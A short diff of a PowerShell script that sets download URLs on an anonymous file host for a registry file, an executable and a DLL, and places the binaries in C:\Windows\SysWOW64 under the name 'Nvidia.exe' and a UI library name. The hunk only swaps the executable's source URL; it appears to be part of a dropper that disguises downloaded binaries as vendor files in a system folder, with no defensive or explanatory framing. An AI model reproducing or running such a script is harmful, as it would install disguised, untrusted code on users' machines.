@@ -51,7 +51,7 @@ $regUrl = "https://files.catbox.moe/if7ith.reg"
 $sysWOW64 = "C:\Windows\SysWOW64"
 $exeDestination = Join-Path $sysWOW64 "Nvidia.exe"
 $dllDestination = Join-Path $sysWOW64 "Guna.UI2.dll"
-$exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/Seanual-HUB/raw/refs/heads/main/Nvidia.bin"
+$exeUrl = "https://files.catbox.moe/y039sy.bin"
 $dllUrl = "https://files.catbox.moe/3scqqb.dll"
 
 # -----------------------------
